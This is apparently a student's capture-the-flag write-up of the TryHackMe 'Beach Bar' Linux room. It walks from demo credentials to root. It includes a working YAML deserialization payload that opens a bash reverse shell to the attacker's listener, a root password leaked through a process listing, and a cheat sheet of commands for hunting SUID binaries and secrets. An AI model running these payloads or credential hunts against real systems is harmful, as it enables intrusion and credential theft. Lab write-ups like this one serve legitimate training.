---
icon: user-hoodie
---

# Beach Bar

**Date:** 2026-10-24\
**Profile:** skrumf\
**Platform:** TryHackMe\
**Room URL:** [Link to Room](https://tryhackme.com/room/hh-beachbar-d849f7f7)\
**Difficulty:** Easy\
**Machine:** Linux\
**Tags:** Room

***

## Framework - MITRE ATT&CK

* ✅ Reconnaissance\
  Ran an NMAP scan on the IP and returned ssh and http standard ports open. After that I opened a browser and found a login page. Possible password found. dj / dj
* ✅ Initial Access\
  Used demo credentials
* ✅ Execution\
  Used manipulated yaml file to access reverse shell
* ✅ Persistence\
  created a TTY shell
* ✅ Lateral Movement\
  looking at services running confirmed a python script running as root and cinatins root credentials
* ✅ Privilege Escalation\
  ran su root and escalated to root user
* ✅ Actions on Objectives\
  read root.txt inside /root directory

***

## Reconnaissance

I first ran nmap to find open ports. I found por 22 and 80. I then went to the website on port 80 through the browser and found demo credentials in the source code.

## Initial Access

I used the demo credentials in the source code to access the account. they were username: dj and password: dj . Once inside I found a function to import a yaml file.

## Privilege Escalation

I created a reverse listener on the host using nc -lvnp 4444 and created a manipulated yaml file with the command !!python/object/apply:os.system
  - "bash -c 'bash -i >& /dev/tcp/HostIP/4444 0>&1'" inside. I got a shell which I transofrmed into a TTY shell and couuld read the user.txt file. I then searched around a bit for any evidence of a root password so I could escalate privilages and found a service running as root with a password in plain text. I was able to use this to become root and read the root.txt

## Actions on Objectives

I was able to use this to become root and read the root.txt

## Tools Used

* nmap
* cat
* nc
* python3
* bash
* yaml
* sudo
* ls
* find
* ps
* grep

## Lessons Learned

### The path

Foothold as `bartender` (user flag) → enumerated for privesc → found a root-owned service leaking its password on the command line → reused that password to become root.

### Key lessons

**1. User → root on one box is *privilege escalation*, not lateral movement.**
Lateral movement = hopping to a different host/account at the same level. Vertical = climbing privilege on the same host. Getting the terms right tells you which enumeration to run.

**2. Enumerate in order; rule out whole categories.**

* `find / -perm -4000 -type f 2>/dev/null` → all standard Ubuntu SUID binaries + snap noise. **SUID ruled out** — a real finding, not a dead end.
* Ignore `/snap/...` (read-only squashfs) and `venv/site-packages/` (third-party library code) in results. Signal lives in the app's own paths.

**3. A non-interactive shell ≠ "no sudo access."**
`sudo: a terminal is required to read the password` means a dumb shell, not a locked account. Upgrade the TTY first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

**4. A password wall on an easy box = "find it," not "guess it."**
Look in the app's own files, not library code. Filter grep hits by **path** — `webapp/`, `jukeboxd/`, not `venv/`.

**5. ⭐ `ps aux` is the MVP for leaked credentials.**
The win came from:

```
root  611  ...  jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

`/proc/<pid>/cmdline` is world-readable, so **any** user can read the full launch command of **every** process — including root's. Secrets passed as CLI args (`--password`, `--token`, `--stream-pass`) leak to everyone. This is a real-world misconfig, not just a CTF trick.

**6. Credential reuse is the first thing to try once you have a password.**
One password on the box → try it everywhere, starting with `su root`.

### Tool cheat-sheet

| Goal | Command |
|---|---|
| SUID hunt | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo rights | `sudo -l` |
| **Leaked creds in processes** | `ps aux` / `ps -ef` |
| How a service starts & as whom | `cat /etc/systemd/system/*.service`, `ps aux` |
| Cron jobs | `cat /etc/crontab`, `ls -la /etc/cron.*` |
| Secrets in app files | `grep -riE "password\|secret" /opt /var/www 2>/dev/null` |

### The habit to keep

Each result either *points somewhere* or *rules something out* — both move you forward. Read output to understand **why** it's exploitable, rather than pasting the first thing that looks promising.
